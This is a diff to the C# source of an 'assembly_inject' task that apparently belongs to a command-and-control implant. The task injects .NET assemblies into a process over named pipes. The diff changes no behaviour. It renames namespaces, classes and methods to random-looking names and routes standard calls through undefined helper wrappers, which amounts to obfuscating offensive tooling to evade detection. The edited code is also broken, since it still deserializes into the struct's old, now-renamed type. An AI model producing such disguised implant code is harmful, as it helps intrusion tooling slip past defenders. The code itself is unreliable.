@@ -8,23 +8,23 @@
 using System;
 using System.Linq;
 using System.Text;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
-using ApolloInterop.Serializers;
+using PhantomInterop.Serializers;
 using System.Threading;
 using System.Collections.Concurrent;
 using System.IO.Pipes;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Classes.Collections;
+using PhantomInterop.Structs.PhantomStructs;
+using PhantomInterop.Classes.Collections;
 
 namespace Tasks
 {
-    public class assembly_inject : Tasking
+    public class EfficientHandler8BF2 : Tasking
     {
         [DataContract]
-        internal struct AssemblyInjectParameters
+        internal struct SpectreProvider4FD3
         {
             [DataMember(Name = "pipe_name")]
             public string PipeName;
@@ -77,8 +77,8 @@ namespace Tasks
                         _complete,
                         _cancellationToken.Token.WaitHandle
                     }, 1000);
-                    output = string.Join("", _assemblyOutput.Flush());
-                    if (!string.IsNullOrEmpty(output))
+                    output = StringProcessor.CombineElements("", _assemblyOutput.Flush());
+                    if (!ValidationHelper.IsStringEmpty(output))
                     {
                         _agent.GetTaskManager().AddTaskResponseToQueue(
                             CreateTaskResponse(
@@ -87,8 +87,8 @@ namespace Tasks
                                 ""));
                     }
                 }
-                output = string.Join("", _assemblyOutput.Flush());
-                if (!string.IsNullOrEmpty(output))
+                output = StringProcessor.CombineElements("", _assemblyOutput.Flush());
+                if (!ValidationHelper.IsStringEmpty(output))
                 {
                     _agent.GetTaskManager().AddTaskResponseToQueue(
                         CreateTaskResponse(
@@ -106,9 +106,9 @@ namespace Tasks
             try
             {
                 AssemblyInjectParameters parameters = _jsonSerializer.Deserialize<AssemblyInjectParameters>(_data.Parameters);
-                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
-                    string.IsNullOrEmpty(parameters.AssemblyName) ||
-                    string.IsNullOrEmpty(parameters.PipeName))
+                if (ValidationHelper.IsStringEmpty(parameters.LoaderStubId) ||
+                    ValidationHelper.IsStringEmpty(parameters.AssemblyName) ||
+                    ValidationHelper.IsStringEmpty(parameters.PipeName))
                 {
                     resp = CreateTaskResponse(
                         $"One or more required arguments was not provided.",
@@ -150,7 +150,7 @@ namespace Tasks
                                     IPCCommandArguments cmdargs = new IPCCommandArguments
                                     {
                                         ByteData = assemblyBytes,
-                                        StringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
+                                        StringData = ValidationHelper.IsStringEmpty(parameters.AssemblyArguments)
                                             ? ""
                                             : parameters.AssemblyArguments,
                                     };
@@ -211,20 +211,20 @@ namespace Tasks
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
-        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
+        private void IntelligentAdapterAD76(object sender, NamedPipeMessageArgs e)
         {
             e.Pipe.Close();
             _cancellationToken.Cancel();
             _complete.Set();
         }
 
-        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
+        private void RobustProvider017A(object sender, NamedPipeMessageArgs e)
         {
             System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
             System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
         }
 
-        public void OnAsyncMessageSent(IAsyncResult result)
+        public void SpectreBridge8C10(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             // Potentially delete this since theoretically the sender Task does everything
@@ -235,7 +235,7 @@ namespace Tasks
             }
         }
 
-        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
+        private void ShadowEngineE81E(object sender, NamedPipeMessageArgs e)
         {
             IPCData d = e.Data;
             string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
